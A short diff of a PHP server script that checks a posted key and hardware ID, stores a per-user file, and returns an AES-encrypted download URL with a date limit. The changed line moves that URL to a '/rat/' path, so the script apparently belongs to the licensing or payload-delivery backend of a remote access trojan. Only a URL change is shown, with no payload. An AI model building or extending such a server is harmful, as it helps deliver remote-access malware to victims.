@@ -113,7 +113,7 @@ if ( (isset($_POST['key'])) && (!empty($_POST['key'])) && (isset($_POST['hwid'])
 	$fileName = sprintf($UNIQUE_USER_FILE, $hwid);
 	file_put_contents($fileName, $data);
 	logger('sending new file');
-	echo bin2hex(AESEncrypt(pad('http://192.168.0.2:5568/'. str_replace('./', '', $fileName), 16), $URL_ENCRYPT_KEY)) .chr(10);
+	echo bin2hex(AESEncrypt(pad('http://127.0.0.1/rat/'. str_replace('./', '', $fileName), 16), $URL_ENCRYPT_KEY)) .chr(10);
 	echo $result['date_limit'] .chr(10);
 }
 else
